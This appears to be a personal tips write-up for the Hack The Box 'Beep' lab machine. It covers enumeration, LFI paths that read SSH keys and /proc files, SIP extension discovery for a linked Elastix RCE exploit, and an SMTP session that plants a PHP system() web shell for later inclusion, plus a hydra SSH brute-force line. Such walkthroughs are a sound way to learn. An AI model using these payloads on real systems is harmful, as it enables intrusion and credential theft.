# Beep Hack The Box Tips

# ${{\color{purple}Initial Recon}}\ $

* Inspect source code
* Launch gobuster at the same time 

`gobuster dir -u http://10.10.10.7/ -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -o gobuster.out`
* Download an image and look at the metadata check the date of upload with `exiftool`
* Visit the site as a user :white_check_mark:
* Add a proxy in the exploit to redirect flows to burp

`searchsploit elastix`

# ${{\color{purple}Initial Foothold}}\ $

* First point when he have a security TLS error in firefox like this 
 ![image](https://user-images.githubusercontent.com/123066149/217526766-f4604150-68a0-465c-8ade-30c2f22b9e17.png)

You have to go to the firefox settings and accept the depreciated protocols -> new tab -> about:config -> security.version.enable-deprecated (true)

# ${{\color{purple}Exploitation}}\ $

LFI tips: 
- /var/lib/<username>/.ssh/id_rsa%00
- /proc/self/status%00 (look at the uid of the user and look at the user who runs the application in `/etc/passwd`)
- check /proc/self/about%00 (check the possible user agent `<?php echo "hello"; ?>`)
- use the burp suite intruder to see if there are any other accessible files
 
SIP tips: 
- if I am in front of a SIP phone I can use `svmap`
 `svmap 10.10.10.7`
 
 ![image](https://user-images.githubusercontent.com/123066149/217537969-6856e779-ba5b-4d18-a566-b5ba7f5af690.png)

 In Elastix 2.2.0 there is a Remote Code Execution and to see how to use it you need to know the extension of the SIP equipment (FreePBX) to find this extension I will use: `svwar`
 
 ![image](https://user-images.githubusercontent.com/123066149/217540202-42ce2dd2-ba52-4b65-9b84-2da904660721.png)

 After that you just have to change the extension value in the exploit :
 
 https://www.exploit-db.com/exploits/18650
 
 ![image](https://user-images.githubusercontent.com/123066149/217540838-b34ce047-8189-477e-bfad-de9ecba90923.png)

 
# ${{\color{purple}Privilege Escalation}}\ $

![image](https://user-images.githubusercontent.com/123066149/217532253-26283ba3-dd22-439b-bfbc-8ddf4a65e467.png)
  
`telnet 10.10.10.7 25` 
  
  ### or
  
`nc -nvv 10.10.10.7 25`
  
``EHLO test.beep.htb``
  
``VRFY asterisk@localhost``
  
``mail from:pwned@haha.io``
  
``rcpt to:asterisk@localhost``
  
``data``
  
``Subject: You got owned``
  
``<?php echo system($REQUEST['id']); ?>``
  
``blanck line``
  
``.``
  
![beep2](https://user-images.githubusercontent.com/123066149/217533503-0b8ad502-2a6b-4d82-ba0b-65842e428c39.PNG)

 use burp to try a code execution : `/var/mail/user%00`
  
# ${{\color{purple}Points of Improvement}}\ $

* Improve my directory brute force
* Use `curl -k (https://) -o xxx.png` use -k for allow insecure server connections
* Use `exiftool` for .png
* Use `ctrl + U` to improve a display
* Use vi `:g/nologin/d` to clean up the output of the `/etc/passwd` file
* When i found a `password` and `user` don't hesitate to directly do a bruteforce

`ssh hydra -L users -P pw ssh://IP`
* Use the smart decode function of burp
